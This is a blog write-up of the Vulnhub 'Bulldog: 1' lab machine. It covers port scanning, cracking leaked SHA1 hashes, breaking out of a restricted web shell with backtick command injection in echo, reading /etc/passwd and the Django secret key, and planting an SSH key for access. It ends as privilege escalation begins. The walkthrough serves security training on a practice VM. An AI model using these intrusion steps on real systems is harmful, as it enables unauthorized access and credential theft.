
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="At the moment I have some times to work again on Vulnhub virtual machine. So here I picked the first one at the moment: Bulldog: 1 A simple boot2root machine by Nick Frichette." />
<meta name="keywords" content="security, vulnhub, hash, boot2root, linux">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="Vulnhub, Bulldog: 1"/>
  <meta property="og:description" content="At the moment I have some times to work again on Vulnhub virtual machine. So here I picked the first one at the moment: Bulldog: 1 A simple boot2root machine by Nick Frichette."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2017/11/vulnhub-bulldog-1.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2017-11-10 19:10:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="vulnhub"/>
  <meta property="article:tag" content="hash"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="linux"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; Vulnhub, Bulldog: 1</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
      </a>

      <h1>
        <a href="../../">maggick's logs</a>
      </h1>

<p>Offensive security tales</p>

      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="vulnhub-bulldog-1">Vulnhub, Bulldog: 1</h1>
    <p>
      Posted on 10 Nov 2017 in <a href="../../category/security.html">security</a>

        &#8226; 5 min read
    </p>
  </header>


  <div>
    <p><img class="align-left"
src="/media/2017.11/1.png" alt="Bulldog homepage" width="162"></p>
<p>At the moment I have some times to work again on Vulnhub virtual machine. So here I picked
the first one at the moment:
<a href="https://www.vulnhub.com/entry/bulldog-1,211/">Bulldog: 1</a>
A simple boot2root machine by <a href="https://twitter.com/frichette_n">Nick Frichette</a>.</p>


<h2>Discovery</h2>
<p>The MOTD of the machine give us its IP address so we can directly launch a nmap at it:</p>
<div class="highlight"><pre><span></span><code>root@kalili:~# nmap -sSV 10.0.2.4

Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-09 14:00 CET
Nmap scan report for 10.0.2.4
Host is up (0.00057s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)
8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)
MAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
</code></pre></div>

<p>There is a ssh service running on port 23 and two web servers on port 80 and
8080. The server on both port seems to be the same and talks dogs photographies.</p>
<h2>Web</h2>
<p><img alt="Website screenshot" src="/media/2017.11/1.png"></p>
<p>We run <code>dirb</code> on the web server on the port 80:</p>
<div class="highlight"><pre><span></span><code><span class="n">root</span><span class="nv">@kalili</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">dirb</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.4</span><span class="w"></span>

<span class="o">-----------------</span><span class="w"></span>
<span class="n">DIRB</span><span class="w"> </span><span class="n">v2</span><span class="mf">.22</span><span class="w"></span>
<span class="k">By</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">Dark</span><span class="w"> </span><span class="n">Raver</span><span class="w"></span>
<span class="o">-----------------</span><span class="w"></span>

<span class="nl">START_TIME</span><span class="p">:</span><span class="w"> </span><span class="n">Thu</span><span class="w"> </span><span class="n">Nov</span><span class="w">  </span><span class="mi">9</span><span class="w"> </span><span class="mi">14</span><span class="err">:</span><span class="mi">06</span><span class="err">:</span><span class="mi">31</span><span class="w"> </span><span class="mi">2017</span><span class="w"></span>
<span class="nl">URL_BASE</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.4</span><span class="o">/</span><span class="w"></span>
<span class="nl">WORDLIST_FILES</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>

<span class="o">-----------------</span><span class="w"></span>

<span class="n">GENERATED</span><span class="w"> </span><span class="nl">WORDS</span><span class="p">:</span><span class="w"> </span><span class="mi">4612</span><span class="w"></span>

<span class="o">----</span><span class="w"> </span><span class="n">Scanning</span><span class="w"> </span><span class="nl">URL</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.4</span><span class="o">/</span><span class="w"> </span><span class="o">----</span><span class="w"></span>
<span class="o">==&gt;</span><span class="w"> </span><span class="nl">DIRECTORY</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.4</span><span class="o">/</span><span class="k">admin</span><span class="o">/</span><span class="w"></span>
<span class="o">==&gt;</span><span class="w"> </span><span class="nl">DIRECTORY</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.4</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="w"></span>
<span class="o">+</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.4</span><span class="o">/</span><span class="n">robots</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="p">(</span><span class="nl">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="err">:</span><span class="mi">1071</span><span class="p">)</span><span class="w"></span>
<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
</code></pre></div>

<p>The result is the same on the port 8080</p>
<p>The admin page present a django login interface.</p>
<p><img alt="Django login page" src="/media/2017.11/2.png"></p>
<p>The dev page contain the link to a web-shell and contact information with some hashes in html comments <code>view-source:http://10.0.2.4/dev/</code>:</p>
<div class="highlight"><pre><span></span><code><span class="n">Team</span><span class="w"> </span><span class="nl">Lead</span><span class="p">:</span><span class="w"> </span><span class="n">alan</span><span class="nv">@bulldogindustries</span><span class="p">.</span><span class="n">com</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="o">--</span><span class="mi">6515229</span><span class="n">daf8dbdc8b89fed2e60f107433da5f2cb</span><span class="o">--&gt;</span><span class="w"></span>
<span class="n">Back</span><span class="o">-</span><span class="n">up</span><span class="w"> </span><span class="n">Team</span><span class="w"> </span><span class="nl">Lead</span><span class="p">:</span><span class="w"> </span><span class="n">william</span><span class="nv">@bulldogindustries</span><span class="p">.</span><span class="n">com</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="o">--</span><span class="mi">38882</span><span class="n">f3b81f8f2bc47d9f3119155b05f954892fb</span><span class="o">--&gt;</span><span class="w"></span>
<span class="n">Front</span><span class="w"> </span><span class="k">End</span><span class="err">:</span><span class="w"> </span><span class="n">malik</span><span class="nv">@bulldogindustries</span><span class="p">.</span><span class="n">com</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="o">--</span><span class="n">c6f7e34d5d08ba4a40dd5627508ccb55b425e279</span><span class="o">--&gt;</span><span class="w"></span>
<span class="n">Front</span><span class="w"> </span><span class="k">End</span><span class="err">:</span><span class="w"> </span><span class="n">kevin</span><span class="nv">@bulldogindustries</span><span class="p">.</span><span class="n">com</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="o">--</span><span class="mf">0e6</span><span class="n">ae9fe8af1cd4192865ac97ebf6bda414218a9</span><span class="o">--&gt;</span><span class="w"></span>
<span class="n">Back</span><span class="w"> </span><span class="k">End</span><span class="err">:</span><span class="w"> </span><span class="n">ashley</span><span class="nv">@bulldogindustries</span><span class="p">.</span><span class="n">com</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="o">--</span><span class="mi">553</span><span class="n">d917a396414ab99785694afd51df3a8a8a3e0</span><span class="o">--&gt;</span><span class="w"></span>
<span class="n">Back</span><span class="w"> </span><span class="k">End</span><span class="err">:</span><span class="w"> </span><span class="n">nick</span><span class="nv">@bulldogindustries</span><span class="p">.</span><span class="n">com</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="o">--</span><span class="n">ddf45997a7e18a25ad5f5cf222da64814dd060d5</span><span class="o">--&gt;</span><span class="w"></span>
<span class="k">Database</span><span class="err">:</span><span class="w"> </span><span class="n">sarah</span><span class="nv">@bulldogindustries</span><span class="p">.</span><span class="n">com</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="c1">--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--&gt;</span>
</code></pre></div>

<p>We launch john against the hashes:</p>
<div class="highlight"><pre><span></span><code><span class="n">root</span><span class="nv">@kalili</span><span class="err">:</span><span class="o">~/</span><span class="n">bulldog</span><span class="err">#</span><span class="w"> </span><span class="n">john</span><span class="w"> </span><span class="n">hashes</span><span class="w"> </span><span class="o">--</span><span class="nf">format</span><span class="o">=</span><span class="n">Raw</span><span class="o">-</span><span class="n">SHA1</span><span class="w"></span>
<span class="k">Using</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="k">input</span><span class="w"> </span><span class="nl">encoding</span><span class="p">:</span><span class="w"> </span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span><span class="w"></span>
<span class="n">Loaded</span><span class="w"> </span><span class="mi">7</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">hashes</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="k">no</span><span class="w"> </span><span class="n">different</span><span class="w"> </span><span class="n">salts</span><span class="w"> </span><span class="p">(</span><span class="n">Raw</span><span class="o">-</span><span class="n">SHA1</span><span class="w"> </span><span class="o">[</span><span class="n">SHA1 128/128 AVX 4x</span><span class="o">]</span><span class="p">)</span><span class="w"></span>
<span class="n">Press</span><span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">abort</span><span class="p">,</span><span class="w"> </span><span class="n">almost</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">status</span><span class="w"></span>
<span class="n">bulldog</span><span class="w">          </span><span class="p">(</span><span class="n">nick</span><span class="p">)</span><span class="w"></span>
<span class="mi">1</span><span class="n">g</span><span class="w"> </span><span class="mi">0</span><span class="err">:</span><span class="mi">00</span><span class="err">:</span><span class="mi">03</span><span class="err">:</span><span class="mi">32</span><span class="w">  </span><span class="mi">3</span><span class="o">/</span><span class="mi">3</span><span class="w"> </span><span class="mf">0.004714</span><span class="n">g</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mi">12965</span><span class="n">Kp</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mi">12965</span><span class="n">Kc</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mi">77831</span><span class="n">KC</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="n">hmj359t</span><span class="p">..</span><span class="n">hmj359l</span><span class="w"></span>
</code></pre></div>

<p>Nick use a weak password and it can be used to login into the Django admin interface but he has no access.</p>
<p>[/media/2017.11/3.png]</p>
<p>Nevertheless nick has access to the restricted web-shell</p>
<p>[/media/2017.11/4.png]</p>
<p>We can explore a bit, cat <code>/etc/passwd</code> but mostly we can access the django secret key in bulldog/settings.py</p>
<div class="highlight"><pre><span></span><code>cat bulldog/settings.py
&lt;SNIP&gt;
# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = &#39;%9a3ph3iwk$v*_#x4ejg8(t5(qll0fl8q8&amp;u+o_g$yi83d*riq&#39;
&lt;SNIP&gt;o
</code></pre></div>

<p>And we can easily break out of the "jail" with the <code>echo</code> command:</p>
<div class="highlight"><pre><span></span><code><span class="n">echo</span><span class="w"> </span><span class="n n-Quoted">`id`</span><span class="w"></span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">django</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">django</span><span class="p">)</span><span class="w"> </span><span class="k">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">django</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="n">sudo</span><span class="p">)</span><span class="w"></span>
</code></pre></div>

<p>Therefore we can create a directory <code>.ssh</code> inside the  django user home:</p>
<div class="highlight"><pre><span></span><code>echo `mkdir /home/django/.ssh`
</code></pre></div>

<p>And then echo our ssh public key inside (you need to change the filed size with the firefox inspector):</p>
<div class="highlight"><pre><span></span><code>echo &#39;ssh-rsa AAAAB3Nt/&lt;SNIP&gt;&#39;&gt; /home/django/.ssh/authorized_keys
</code></pre></div>

<p>Then we got an interactive shell with ssh:</p>
<div class="highlight"><pre><span></span><code>ssh -ldjango 10.0.2.4 -p23
</code></pre></div>

<h2>PrivEsc</h2>
<p>By looking more into the users directory we discover that we have a read access on djangoadmin
files and that a <code>.hiddenadmindirectory</code> is present with a note and an executable:</p>
<div class="highlight"><pre><span></span><code><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">ahlR</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="w"></span>
<span class="o">/</span><span class="nl">home</span><span class="p">:</span><span class="w"></span>
<span class="n">total</span><span class="w"> </span><span class="mi">16</span><span class="n">K</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="n">root</span><span class="w">         </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="mi">18</span><span class="err">:</span><span class="mi">16</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="n">root</span><span class="w">         </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">25</span><span class="w"> </span><span class="mi">22</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="p">..</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">19</span><span class="err">:</span><span class="mi">45</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">6</span><span class="w"> </span><span class="n">django</span><span class="w">       </span><span class="n">django</span><span class="w">       </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Nov</span><span class="w">  </span><span class="mi">9</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">43</span><span class="w"> </span><span class="n">django</span><span class="w"></span>

<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="nl">bulldogadmin</span><span class="p">:</span><span class="w"></span>
<span class="n">total</span><span class="w"> </span><span class="mi">40</span><span class="n">K</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">19</span><span class="err">:</span><span class="mi">45</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="n">root</span><span class="w">         </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="mi">18</span><span class="err">:</span><span class="mi">16</span><span class="w"> </span><span class="p">..</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w">  </span><span class="mi">220</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="mi">17</span><span class="err">:</span><span class="mi">39</span><span class="w"> </span><span class="p">.</span><span class="n">bash_logout</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="mf">3.7</span><span class="n">K</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="mi">17</span><span class="err">:</span><span class="mi">39</span><span class="w"> </span><span class="p">.</span><span class="n">bashrc</span><span class="w"></span>
<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="mi">17</span><span class="err">:</span><span class="mi">40</span><span class="w"> </span><span class="p">.</span><span class="n">cache</span><span class="w"></span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">19</span><span class="err">:</span><span class="mi">44</span><span class="w"> </span><span class="p">.</span><span class="n">hiddenadmindirectory</span><span class="w"></span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="mi">22</span><span class="err">:</span><span class="mi">18</span><span class="w"> </span><span class="p">.</span><span class="n">nano</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w">  </span><span class="mi">655</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="mi">17</span><span class="err">:</span><span class="mi">39</span><span class="w"> </span><span class="p">.</span><span class="n">profile</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w">   </span><span class="mi">66</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="mi">22</span><span class="err">:</span><span class="mi">18</span><span class="w"> </span><span class="p">.</span><span class="n">selected_editor</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w">    </span><span class="mi">0</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="mi">17</span><span class="err">:</span><span class="mi">45</span><span class="w"> </span><span class="p">.</span><span class="n">sudo_as_admin_successful</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w">  </span><span class="mi">217</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="mi">18</span><span class="err">:</span><span class="mi">20</span><span class="w"> </span><span class="p">.</span><span class="n">wget</span><span class="o">-</span><span class="n">hsts</span><span class="w"></span>
<span class="nl">ls</span><span class="p">:</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="k">open</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="s1">&#39;/home/bulldogadmin/.cache&#39;</span><span class="err">:</span><span class="w"> </span><span class="n">Permission</span><span class="w"> </span><span class="n">denied</span><span class="w"></span>

<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bulldogadmin</span><span class="o">/</span><span class="p">.</span><span class="nl">hiddenadmindirectory</span><span class="p">:</span><span class="w"></span>
<span class="n">total</span><span class="w"> </span><span class="mi">24</span><span class="n">K</span><span class="w"></span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">19</span><span class="err">:</span><span class="mi">44</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">19</span><span class="err">:</span><span class="mi">45</span><span class="w"> </span><span class="p">..</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="n">bulldogadmin</span><span class="w"> </span><span class="mf">8.6</span><span class="n">K</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">25</span><span class="w"> </span><span class="mi">22</span><span class="err">:</span><span class="mi">18</span><span class="w"> </span><span class="n">customPermissionApp</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">-- 1 bulldogadmin bulldogadmin  619 Sep 20 19:44 note</span>
</code></pre></div>

<h3>Reverse</h3>
<p>The note's content is the following:</p>
<div class="highlight"><pre><span></span><code><span class="nv">Nick</span>,

<span class="nv">I</span><span class="s1">&#39;</span><span class="s">m working on the backend permission stuff. Listen, it</span><span class="s1">&#39;</span><span class="nv">s</span> <span class="nv">super</span> <span class="nv">prototype</span> <span class="nv">but</span> <span class="nv">I</span> <span class="nv">think</span> <span class="nv">it</span><span class="s1">&#39;</span><span class="s">s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not!</span>

<span class="nv">It</span><span class="s1">&#39;</span><span class="s">s great stuff! Once I</span><span class="s1">&#39;</span><span class="nv">m</span> <span class="nv">finished</span> <span class="nv">with</span> <span class="nv">it</span>, <span class="nv">a</span> <span class="nv">hacker</span> <span class="nv">wouldn</span><span class="s1">&#39;</span><span class="s">t even be able to reverse it! Keep in mind that it</span><span class="s1">&#39;</span><span class="nv">s</span> <span class="nv">still</span> <span class="nv">a</span> <span class="nv">prototype</span> <span class="nv">right</span> <span class="nv">now</span>. <span class="nv">I</span> <span class="nv">am</span> <span class="nv">about</span> <span class="nv">to</span> <span class="nv">get</span> <span class="nv">it</span> <span class="nv">working</span> <span class="nv">with</span> <span class="nv">the</span> <span class="nv">Django</span> <span class="nv">user</span> <span class="nv">account</span>. <span class="nv">I</span><span class="s1">&#39;</span><span class="s">m not sure how I</span><span class="s1">&#39;</span><span class="nv">ll</span> <span class="nv">implement</span> <span class="nv">it</span> <span class="k">for</span> <span class="nv">the</span> <span class="nv">others</span>. <span class="nv">Maybe</span> <span class="nv">the</span> <span class="nv">webserver</span> <span class="nv">is</span> <span class="nv">the</span> <span class="nv">only</span> <span class="nv">one</span> <span class="nv">who</span> <span class="nv">needs</span> <span class="nv">to</span> <span class="nv">have</span> <span class="nv">root</span> <span class="nv">access</span> <span class="nv">sometimes</span>?

<span class="nv">Let</span> <span class="nv">me</span> <span class="nv">know</span> <span class="nv">what</span> <span class="nv">you</span> <span class="nv">think</span> <span class="nv">of</span> <span class="nv">it</span><span class="o">!</span>

<span class="o">-</span><span class="nv">Ashley</span>
</code></pre></div>

<p>We copy the executable to make it our own and be able to execute it:</p>
